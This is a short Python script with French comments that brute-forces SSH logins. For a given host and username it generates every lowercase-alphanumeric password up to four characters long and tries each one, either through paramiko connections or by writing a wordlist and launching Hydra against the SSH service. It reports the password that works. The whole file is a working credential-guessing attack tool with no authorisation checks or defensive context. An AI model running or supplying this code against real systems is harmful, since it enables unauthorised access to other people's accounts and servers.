import paramiko
import itertools
import string
import subprocess

# Attaque par permutation (placeholder)
def brute_force_permutation(target, username, use_hydra=False):
    if use_hydra:
        print(f"Brute force permutation sur {target} avec Hydra pour l'utilisateur {username}")
        # Génération d'un fichier temporaire de mots de passe
        chars = string.ascii_lowercase + string.digits
        wordlist = "hydra_permutation.txt"
        with open(wordlist, "w") as f:
            for length in range(1, 5):
                for pwd_tuple in itertools.product(chars, repeat=length):
                    f.write(''.join(pwd_tuple) + "\n")
        try:
            result = subprocess.run([
                "hydra", "-l", username, "-P", wordlist, target, "ssh"
            ], capture_output=True, text=True)
            print(result.stdout)
        except Exception as e:
            print(f"Erreur lors de l'exécution d'Hydra : {e}")
    else:
        print(f"Brute force permutation sur {target} avec paramiko pour l'utilisateur {username}")
        chars = string.ascii_lowercase + string.digits
        for length in range(1, 5):
            for pwd_tuple in itertools.product(chars, repeat=length):
                password = ''.join(pwd_tuple)
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(target, username=username, password=password, timeout=2)
                    print(f"Mot de passe trouvé: {password}")
                    ssh.close()
                    return
                except paramiko.AuthenticationException:
                    print(f"Echec avec: {password}")
                except Exception as e:
                    print(f"Erreur: {e}")
        print("Mot de passe non trouvé par permutation.")
